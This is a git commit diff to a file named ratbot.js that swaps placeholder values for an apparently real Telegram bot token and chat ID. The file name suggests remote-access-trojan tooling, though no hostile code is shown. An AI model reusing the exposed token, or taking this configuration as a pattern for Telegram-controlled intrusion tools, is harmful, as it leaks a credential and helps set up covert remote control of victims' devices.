32bb7c5d7338a4acc8099aab8106e27fa155be44
rptech0 <techr670@gmail.com>
2025-07-18 09:00:39 +0530

    Update ratbot.js

--- ratbot.js
+++ ratbot.js
@@ -7,8 +7,8 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token ='YOUR BOT TOKEN HARE'
-const id = 'YOUR ID HARE'
+const token ='8192676900:AAGZXiPfFqcPYNJt3rWoeJoTJw-IgfAmmRw'
+const id = '1295351994'
 const address = 'https://www.youtube.com'
 
 const app = express();
